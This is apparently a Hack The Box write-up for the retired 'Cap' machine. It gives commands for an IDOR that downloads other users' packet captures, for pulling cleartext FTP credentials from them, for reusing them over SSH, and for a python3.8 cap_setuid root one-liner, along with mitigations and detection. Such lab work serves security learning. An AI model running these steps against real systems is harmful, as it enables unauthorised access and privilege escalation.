---
machine: Cap
os: Linux
difficulty: Easy
platform: Hack The Box
achievement: https://labs.hackthebox.com/achievement/machine/4187928/351
category: Machines
state: Retired
pwned: 2026-11-03
tags: [linux, web, idor, pcap, capabilities]
---

# Cap — Hack The Box

**English** | [🇪🇸 Español](README.md)

> **Retired** machine. No flags or credentials in this document.

## TL;DR

A panel generates packet captures (pcap) and serves them by an incrementing identifier. Changing that identifier downloads another user's capture, and inside travels a **cleartext FTP session**. Those credentials give SSH access, and `getcap` shows `python3.8` carries `cap_setuid` → instant root.

## Recon

```bash
nmap -Pn -p- --min-rate 2000 <TARGET_IP>
nmap -Pn -sCV -p 21,22,80 <TARGET_IP>
```

| Port | Service | Version |
|---|---|---|
| 21/tcp | FTP | vsftpd |
| 22/tcp | SSH | OpenSSH |
| 80/tcp | HTTP | Gunicorn / Python app |

```bash
echo "<TARGET_IP> cap.htb" | sudo tee -a /etc/hosts
```

## Enumeration

The app is a dashboard ("Security Dashboard") with the views *Dashboard*, *Security Snapshot*, *IP Config* and *Network Status*.

- `Security Snapshot` starts a 5-second capture and redirects to a download: `/data/<id>`.
- The identifier in the URL is the only access control.

```bash
ffuf -u http://cap.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt \
     -mc 200,201,302,401,403 -t 60
```

## Foothold

### 1. IDOR on the captures

```bash
curl -s -o cap0.pcap http://cap.htb/data/0
curl -s -o cap1.pcap http://cap.htb/data/1
```

Enumerating identifiers yields captures from other sessions. The useful one contains a cleartext FTP login:

```bash
tcpdump -r cap0.pcap -nn -A | grep -iE 'USER|PASS'
# USER nathan
# PASS <PASS>
```

Wireshark works too: *Follow TCP Stream* on port 21.

### 2. SSH with the credentials from the pcap

```bash
ssh nathan@cap.htb
cat user.txt      # <USER_FLAG>
```

## Privilege escalation

```bash
id
sudo -l            # nothing
getcap -r / 2>/dev/null
```

```
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
```

That binary can set its own UID to 0, so one line is enough:

```bash
/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
id                 # uid=0(root)
cat /root/root.txt # <ROOT_FLAG>
```

## Evidence

- `nmap` showing 21/22/80 and the Gunicorn version.
- Downloading `/data/0` versus `/data/1` (two different captures, same unprivileged user).
- `Follow TCP Stream` showing `USER`/`PASS` in the clear.
- `getcap` with `cap_setuid=ep` and `id` as root.

## Lessons learned

- An incrementing identifier in a URL is a potential IDOR: if the server never checks ownership, the data belongs to everyone.
- FTP sends credentials in cleartext; one capture is enough to reuse them over SSH.
- Capabilities are a modern SUID: `cap_setuid` on an interpreter is instant root and never shows up in `find -perm -4000`.
- `getcap -r /` should be as mandatory as hunting SUIDs on any Linux box. The exact interpreter version comes from `getcap`'s output, not from the port banner: here it is `python3.8`.

## Mitigations and detection

- Per-object authorisation: every download must verify the resource belongs to the authenticated user, not merely that it exists.
- Non-guessable identifiers (UUIDs) and expiry on captures.
- Replace FTP with SFTP/FTPS; never reuse service passwords over SSH.
- Remove `cap_setuid` from interpreters and binaries that do not need it (`setcap -r`), and audit `getcap` periodically.
- Detection: sequential downloads of `/data/<n>` from one session and SSH logins from new IPs with service accounts.

## References

- <https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control>
- <https://man7.org/linux/man-pages/man7/capabilities.7.html>
- <https://man7.org/linux/man-pages/man8/getcap.8.html>
